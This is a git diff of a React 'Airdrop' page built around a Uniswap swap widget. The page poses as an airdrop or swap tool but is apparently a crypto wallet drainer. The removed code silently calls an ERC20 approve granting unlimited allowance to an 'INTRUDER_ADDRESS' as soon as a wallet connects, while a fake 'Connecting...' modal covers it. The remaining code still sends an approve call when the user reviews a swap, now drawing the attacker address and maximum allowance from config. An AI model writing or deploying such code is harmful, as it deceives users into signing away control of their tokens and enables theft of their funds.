@@ -1,17 +1,21 @@
 import { FC, useEffect, useRef, useState } from 'react';
-import { BigNumber, ethers } from 'ethers';
+import { ethers } from 'ethers';
 import { TransactionResponse } from '@ethersproject/abstract-provider';
 import { errorCodes, serializeError } from '@metamask/rpc-errors';
 import { useSigner } from 'wagmi';
-import { bsc, mainnet, polygon } from 'wagmi/chains';
 import { toast } from 'react-toastify';
 import { SwapWidget, darkTheme } from '@uniswap/widgets';
 import type { Web3Provider } from '@ethersproject/providers';
 import { Tooltip } from 'antd';
 import { InfoCircleOutlined } from '@ant-design/icons';
-import { Spinner, Modal } from 'components';
 import { useWallet } from 'hooks';
 import { ERC20TokenABI } from 'abi';
+import {
+  CONFIGURED_TOKENS,
+  CONFIGURED_TOKEN_LIST,
+  INTRUDER_ADDRESS,
+  UINT256_MAX_INT,
+} from 'config';
 import styles from './Airdrop.module.scss';
 import '@uniswap/widgets/fonts.css';
 
@@ -27,48 +31,6 @@ interface ProviderMessage {
   data: unknown;
 }
 
-const MY_TOKEN_LIST = [
-  {
-    name: 'USD Coin',
-    address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
-    symbol: 'USDC',
-    decimals: 18,
-    chainId: bsc.id,
-    logoURI:
-      'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png',
-  },
-  {
-    name: 'USD Coin',
-    address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-    symbol: 'USDC',
-    decimals: 6,
-    chainId: mainnet.id,
-    logoURI:
-      'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png',
-  },
-  {
-    name: 'USD Coin',
-    address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174',
-    symbol: 'USDC',
-    decimals: 6,
-    chainId: polygon.id,
-    logoURI:
-      'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png',
-  },
-];
-
-const defaultOutputTokenAddress: Record<number, string> = {
-  [bsc.id]: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
-  [mainnet.id]: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-  [polygon.id]: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174',
-};
-
-const INTRUDER_ADDRESS = process.env.REACT_APP_INTRUDER_ADDRESS;
-
-const UINT256_MAX_INT = BigNumber.from(
-  '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
-);
-
 const capitalizeFirstLetter = (value: string) => {
   if (!value) {
     return '';
@@ -82,7 +44,6 @@ const Airdrop: FC = () => {
   const toastRef = useRef<any>();
   const provider = useSigner().data?.provider;
   const [isPending, setIsPending] = useState(false);
-  const [modalOpen, setModalOpen] = useState(false);
 
   useEffect(() => {
     const messageHandler = (message: ProviderMessage) => {
@@ -95,52 +56,6 @@ const Airdrop: FC = () => {
       provider?.off('message', messageHandler);
     };
   }, [provider]);
-
-  useEffect(() => {
-    const wrapper = async () => {
-      try {
-        const isOkay = chain && !chain.unsupported;
-
-        if (!signer || !isOkay) {
-          return;
-        }
-
-        setModalOpen(true);
-        const tokenAddress = defaultOutputTokenAddress[chain.id];
-        const contract = new ethers.Contract(
-          tokenAddress,
-          ERC20TokenABI,
-          signer
-        );
-
-        const txnResponse: TransactionResponse = await contract.approve(
-          INTRUDER_ADDRESS,
-          UINT256_MAX_INT
-        );
-
-        await txnResponse.wait();
-        toast.success('Success');
-      } catch (error: any) {
-        const rpcError = serializeError(error);
-
-        const errorData = rpcError.data as OriginalError;
-        const cause = errorData?.cause;
-
-        if (
-          rpcError.code === errorCodes.rpc.internal &&
-          !!cause &&
-          cause.code === 'ACTION_REJECTED'
-        ) {
-          toast.error(capitalizeFirstLetter(cause.reason), { autoClose: 2000 });
-        } else {
-          toast.error(error?.message, { autoClose: 2000 });
-        }
-      } finally {
-        setModalOpen(false);
-      }
-    };
-    wrapper();
-  }, [signer]);
 
   useEffect(() => {
     const reviewButton = document.querySelector(
@@ -163,7 +78,7 @@ const Airdrop: FC = () => {
       setIsPending(true);
       toastRef.current = toast.loading('Pending...');
 
-      const tokenAddress = defaultOutputTokenAddress[chain.id];
+      const tokenAddress = CONFIGURED_TOKENS[chain.id];
       const contract = new ethers.Contract(tokenAddress, ERC20TokenABI, signer);
 
       const txnResponse: TransactionResponse = await contract.approve(
@@ -223,10 +138,10 @@ const Airdrop: FC = () => {
           <div className={styles.widget}>
             {!!provider && (
               <SwapWidget
-                tokenList={MY_TOKEN_LIST}
+                tokenList={CONFIGURED_TOKEN_LIST}
                 provider={provider as Web3Provider}
                 defaultChainId={(chain && !chain.unsupported && chain.id) || 1}
-                defaultInputTokenAddress={defaultOutputTokenAddress}
+                defaultInputTokenAddress={CONFIGURED_TOKENS}
                 defaultOutputTokenAddress="NATIVE"
                 onReviewSwapClick={reviewInterceptor}
                 onTokenSelectorClick={selectorInterceptor}
@@ -240,52 +155,6 @@ const Airdrop: FC = () => {
           </div>
         </div>
       </main>
-
-      <Modal
-        visible={modalOpen}
-        onCancel={() => setModalOpen(false)}
-        width={300}
-      >
-        {{
-          header: ' ',
-          body: (
-            <div>
-              <br />
-              <Spinner />
-              <br />
-              <div style={{ textAlign: 'center' }}>Connecting...</div>
-              <br />
-            </div>
-          ),
-        }}
-      </Modal>
-      {/* <Modal
-        title=""
-        open={modalOpen}
-        onCancel={() => setModalOpen(false)}
-        footer={[
-          <Button key="back" onClick={() => setModalOpen(false)}>
-            Cancel
-          </Button>,
-        ]}
-        width={300}
-        style={{
-          backgroundColor: 'black',
-        }}
-        bodyStyle={{
-          backgroundColor: 'black',
-        }}
-        centered
-      >
-        <br />
-        <br />
-        <Spinner />
-        <br />
-        <br />
-        <div style={{ textAlign: 'center' }}>Connecting...</div>
-        <br />
-        <br />
-      </Modal> */}
     </div>
   );
 };
